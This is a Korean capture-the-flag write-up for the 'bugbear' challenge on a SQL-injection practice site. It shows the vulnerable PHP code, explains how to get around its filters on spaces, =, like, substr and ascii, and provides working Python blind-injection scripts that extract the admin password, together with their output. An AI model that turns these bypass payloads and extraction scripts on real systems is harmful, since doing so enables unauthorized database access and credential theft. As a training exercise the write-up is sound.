# bugbear

## 1. Code
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
  if(preg_match('/\'|substr|ascii|=|or|and| |like|0x/i', $_GET[no])) exit("HeHe"); 
  $query = "select id from prob_bugbear where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_bugbear where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("bugbear"); 
  highlight_file(__FILE__); 
?>
```

## 2. Condition
- GET 파라미터 `no`에서는 `'`, `substr`, `ascii`, `=`, `or`, `and`, `공백`, `like`, `0x`를 필터링 한다.
&rarr; 점점 필터링이 늘어만 간다.
- admin의 정확한 pw를 알아야 한다.

## 3. Solution
python 스크립트를 이용해 blind-sqlinjection 한다.

a. pw의 길이
b. pw의 값


### a. Length of pw
변수명 | 값
---|---:
`no` | 1234%0a||%0aid%0ain%0a("admin")%0a&&%0alength(pw)<`i`


공백dms `%0a`로 우회하였다.
`=`과 `like`모두 필터링하므로, `id in ("admin")` 구문을 활용하였다.
마지막 정수와의 비교 부분의 `=`은 `<`으로 우회하였다.


이후, 비교값 `i`는 반복문을 통해 적당값(ex. 1~20)을 넣어준다.

```python
import requests

cookie = {'PHPSESSID' : '~~~~'}

for i in range(1,21):
    url = "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?\
            no=1234%%0a||%%0aid%%0ain%%0a(\"admin\")%%0a%%26%%26%%0alength(pw)<%d" % i
    res = requests.get(url, cookies=cookie)
    
    if "Hello admin" in res.text:
        pw_len = i-1
        print("Length of pw : %d" % pw_len)
        break
```

스크립트 결과는 다음과 같다.
```
Length of pw : 8
```
---


### b. Value of pw

변수명 | 값
---|---:
`no` | 1234%0a||%0aid%0ain%0a("admin")%0a&&%0ahex(mid(pw,1,1))<hex(10)


마찬가지로 =, like는 `in("~~")`구문으로, ascii는 hex로 우회하였다.

a. Length of pw 의 코드에 추가해 보자.

```python
import requests

cookie = {'PHPSESSID' : '~~~~'}

for i in range(1,21):
    url = "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?\
            no=1234%%0a||%%0aid%%0ain%%0a(\"admin\")%%0a%%26%%26%%0alength(pw)<%d" % i
    res = requests.get(url, cookies=cookie)
    
    if "Hello admin" in res.text:
        pw_len = i-1
        print("Length of pw : %d" % pw_len)
        break
        
pw_value = ""
for i in range(pw_len):
    for j in range(33,127):
        url = "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?\
                no=1234%%0a||%%0aid%%0ain%%0a(\"admin\")%%0a%%26%%26%%0ahex(mid(pw,%d,1))<hex(%d)" % (i+1, j)
        res = requests.get(url, cookies=cookie)

        if "Hello admin" in res.text:
            pw_value += chr(j-1)
            print("pw(%d) : %s" % (i+1, pw_value))
            break
```

스크립트 결과는 다음과 같다.
```
Length of pw : 8
pw(1) : 5
pw(2) : 52
pw(3) : 52d
pw(4) : 52dc
pw(5) : 52dc3
pw(6) : 52dc39
pw(7) : 52dc399
pw(8) : 52dc3991
```
---



나온 pw 값을 최종적으로 대입해 보면 문제가 해결된다.

변수명 | 값
---|---:
`pw` | 52dc3991